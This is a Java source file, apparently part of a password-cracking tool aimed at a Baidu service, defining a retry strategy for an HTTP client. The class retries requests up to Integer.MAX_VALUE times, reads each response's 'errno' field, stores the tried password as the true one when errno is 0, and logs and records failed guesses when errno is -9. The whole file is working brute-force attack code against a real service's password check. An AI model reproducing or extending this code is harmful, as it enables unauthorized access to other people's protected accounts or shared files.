package priv.light.baidu;

import com.fasterxml.jackson.databind.JsonNode;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.NonNull;
import org.apache.hc.client5.http.impl.DefaultHttpRequestRetryStrategy;
import org.apache.hc.core5.http.*;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.http.protocol.HttpContext;
import org.apache.hc.core5.util.TimeValue;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.List;

/**
 * @author Light
 * @date 2022/4/2 12:32
 */

@EqualsAndHashCode(callSuper = true)
@Data
public class RetryStrategy extends DefaultHttpRequestRetryStrategy {

    private static final String JSON = "application/json";
    private static final int PASSWORD_ERROR = -9;

    private final CrackPasswordPool crackPasswordPool;

    public RetryStrategy(@NonNull CrackPasswordPool crackPasswordPool) {
        this(TimeValue.ofNanoseconds(500), crackPasswordPool);
    }

    public RetryStrategy(TimeValue defaultRetryInterval, @NonNull CrackPasswordPool crackPasswordPool) {
        super(Integer.MAX_VALUE, defaultRetryInterval);
        this.crackPasswordPool = crackPasswordPool;
    }

    @Override
    public boolean retryRequest(HttpResponse response, int execCount, HttpContext context) {
        if (!(response instanceof ClassicHttpResponse)) {
            return false;
        }

        HttpUtil httpUtil = this.crackPasswordPool.getHttpUtil();
        boolean needRetry = true;
        try (final ClassicHttpResponse closeableResponse = (ClassicHttpResponse) response) {
            int code = closeableResponse.getCode();
            if (code != HttpStatus.SC_NOT_FOUND && code != HttpStatus.SC_PROXY_AUTHENTICATION_REQUIRED) {
                HttpEntity body = closeableResponse.getEntity();
                if (body.getContentType().contains(JSON)) {
                    String bodyText = EntityUtils.toString(body, StandardCharsets.UTF_8);
                    EntityUtils.consume(body);

                    JsonNode responseJson = HttpUtil.OBJECT_MAPPER.readTree(bodyText);
                    int errorNo = responseJson.path("errno").asInt();

                    ClassicHttpRequest request = (ClassicHttpRequest) context.getAttribute("http.request");
                    List<NameValuePair> parameters = EntityUtils.parse(request.getEntity());
                    String password = parameters.get(0).getValue();
                    if (errorNo == 0) {
                        this.crackPasswordPool.getTruePassword().set(password);
                        httpUtil.dispose();
                        needRetry = false;
                    } else {
                        if (errorNo == PASSWORD_ERROR) {
                            System.out.println(password);
                            this.crackPasswordPool.getHasTestPasswords().add(password);
                            needRetry = false;
                        }
                    }
                }
            }
        } catch (IOException | ParseException e) {
            e.printStackTrace();
        }

        return needRetry && this.crackPasswordPool.shouldContinue();
    }

}
